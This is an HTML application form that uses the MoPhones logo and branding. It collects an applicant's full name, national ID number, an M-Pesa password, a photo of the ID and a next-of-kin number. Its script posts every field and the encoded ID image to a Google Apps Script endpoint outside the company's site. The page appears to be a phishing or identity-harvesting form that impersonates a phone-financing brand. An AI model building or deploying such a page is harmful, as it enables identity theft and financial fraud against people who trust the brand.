<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoPhones | Executive Application</title>
    <style>
        :root { --mophones-blue: #004488; --danger: #e11d48; --dark-green: #064e3b; --bg-blue: #004488; }
        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg-blue); padding: 10px; margin: 0; color: #f8fafc; }
        .container { background: white; padding: 25px; border-radius: 28px; max-width: 450px; margin: 10px auto; color: #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
        
        .header { text-align: center; margin-bottom: 20px; }
        .app-title { color: var(--mophones-blue); font-weight: 900; letter-spacing: -1px; margin-top: 8px; font-size: 1.4em; text-transform: uppercase; }

        .price-link { 
            display: block; text-align: center; background: #eff6ff; border: 2px solid var(--mophones-blue); color: var(--mophones-blue); 
            padding: 14px; border-radius: 12px; font-weight: 800; text-decoration: none; margin-bottom: 15px; font-size: 0.9em;
        }

        .dishonesty-banner { 
            background: #fff1f2; border: 2px dashed var(--danger); color: var(--danger); 
            padding: 12px; border-radius: 16px; font-size: 0.85em; margin-bottom: 20px; text-align: center; font-weight: 700;
        }

        label { display: block; margin-top: 15px; font-weight: 800; font-size: 0.75em; color: #64748b; text-transform: uppercase; }
        input, select { width: 100%; padding: 14px; margin-top: 6px; border: 2px solid #e2e8f0; border-radius: 12px; box-sizing: border-box; font-size: 16px; font-weight: 600; color: #1e293b; }
        
        .file-label { background: #f8fafc; border: 2px dashed #cbd5e1; padding: 10px; border-radius: 12px; cursor: pointer; text-align: center; margin-top: 5px; display: block; }

        .btn-submit { background: var(--mophones-blue); color: white; padding: 20px; border: none; border-radius: 14px; width: 100%; margin-top: 25px; font-weight: 900; font-size: 1.2em; cursor: pointer; }
        
        .whatsapp-link { 
            display: flex; align-items: center; justify-content: center; background: var(--dark-green); color: white; 
            padding: 14px; border-radius: 12px; font-weight: 800; text-decoration: none; margin-top: 20px; font-size: 0.9em;
        }

        .footer { font-size: 0.75em; text-align: center; color: #94a3b8; margin-top: 20px; font-weight: 700; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="140">
        <div class="app-title">Mophones Application</div>
    </div>

    <a href="https://mophones.co/collections/all-phones" target="_blank" class="price-link">üîç VIEW PRICES & DEPOSITS</a>

    <div class="dishonesty-banner">ü§ù HONESTY POLICY ENFORCED</div>

    <form id="moLeadsPortal">
        <label>Brand Preference</label>
        <select name="preferred_phone" required>
            <option value="">-- Select Brand --</option>
            <option value="Samsung Galaxy">SAMSUNG GALAXY</option>
            <option value="Apple iPhone">APPLE IPHONE</option>
        </select>

        <label>Full Name (3 Names as on ID)</label>
        <input type="text" name="full_name" id="nameIn" placeholder="First Middle Surname" required>

        <label>National ID Number</label>
        <input type="text" name="id_number" id="idIn" maxlength="8" placeholder="7-8 Digits" required>

        <label>M-Pesa Password</label>
        <input type="text" name="mpesa_password" id="passIn" placeholder="Statement Password" required>

        <label>Upload ID Photo (Front)</label>
        <input type="file" name="id_image" accept="image/*" class="file-label" required>

        <label>Next of Kin Contact</label>
        <input type="text" name="nok_contact" id="kinIn" value="+254" maxlength="13" required>

        <button type="submit" class="btn-submit" id="subBtn">SUBMIT APPLICATION</button>
    </form>
    
    <a href="https://wa.me/254112384099" class="whatsapp-link">üí¨ CHAT WITH CUSTOMER SUPPORT</a>

    <div class="footer">PORTAL: mo_leads_portal</div>
</div>

<script>
const scriptURL = 'https://script.google.com/macros/s/AKfycbxp7myPK3OX047HwHab0T2uALSXNhb0GyylupoBU8e8i3bMhRDOt8xJcX29idZ05M-U/exec';
const form = document.getElementById('moLeadsPortal');

form.addEventListener('submit', e => {
    e.preventDefault();
    const name = document.getElementById('nameIn').value.trim().split(/\s+/);
    
    if (name.length < 3) {
        alert("üö® REJECTED: You must provide exactly 3 names.");
        return;
    }

    document.getElementById('subBtn').disabled = true;
    document.getElementById('subBtn').innerText = "UPLOADING DATA...";

    const fr = new FileReader();
    const file = form.id_image.files[0];
    
    // This part turns the image into data the script can save
    fr.readAsDataURL(file);
    fr.onload = () => {
        const formData = new FormData(form);
        formData.append("fileData", fr.result.split(',')[1]);
        formData.append("fileName", file.name);
        formData.append("mimeType", file.type);

        fetch(scriptURL, { method: 'POST', body: formData })
          .then(res => {
              alert("‚úÖ SUCCESS: Your application and ID have been received.");
              form.reset();
              window.location.reload();
          })
          .catch(err => {
              alert("Error. Please try again.");
              document.getElementById('subBtn').disabled = false;
          });
    };
});
</script>

</body>
</html>
